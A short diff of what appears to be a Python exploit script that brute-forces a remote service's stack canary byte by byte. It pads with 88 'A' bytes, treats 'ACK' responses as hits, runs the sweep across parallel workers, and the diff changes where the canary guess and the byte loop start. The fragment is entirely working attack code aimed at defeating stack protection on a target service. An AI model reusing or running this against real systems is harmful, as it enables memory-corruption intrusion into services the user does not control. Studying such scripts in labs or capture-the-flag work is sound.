@@ -31,10 +31,10 @@ def sweep(prefix,label,workers=12,limit=.65):
             if r[0]=='ACK':print(label, "candidate",hex(x),flush=True)
     print(label,"counts",dict(collections.Counter(results.values())),flush=True)
     return [x for x,v in results.items() if v=='ACK']
-canary=bytes.fromhex('00e2')
+canary=b'\x00'
 prefix=b'A'*88
 print('START',time.asctime(),flush=True)
-for n in range(2,8):
+for n in range(1,8):
     good=sweep(prefix+canary,'CANARY_'+str(n))
     confirmed=[]
     for v in good:
